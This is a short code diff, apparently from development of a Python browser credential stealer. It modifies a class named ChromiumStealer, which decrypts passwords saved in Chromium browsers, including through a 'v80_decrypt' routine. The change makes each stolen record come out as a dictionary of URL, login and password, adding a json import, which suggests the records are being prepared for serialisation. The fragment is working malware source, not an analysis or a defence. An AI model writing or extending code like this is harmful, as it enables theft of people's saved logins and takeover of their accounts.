@@ -1,4 +1,4 @@
-import sqlite3, os, tempfile, string, random, shutil
+import sqlite3, os, tempfile, string, random, shutil, json
 
 from .crypter import Crypter
 from .browsers import Browsers
@@ -22,7 +22,7 @@ class ChromiumStealer:
                         password = self.crypter.v80_decrypt(password)
                     else:
                         password = decrypted_password
-                    yield (url, login, password)
+                    yield {'url': url, 'login': login, 'password': password}
                 except:
                     yield None
                     pass
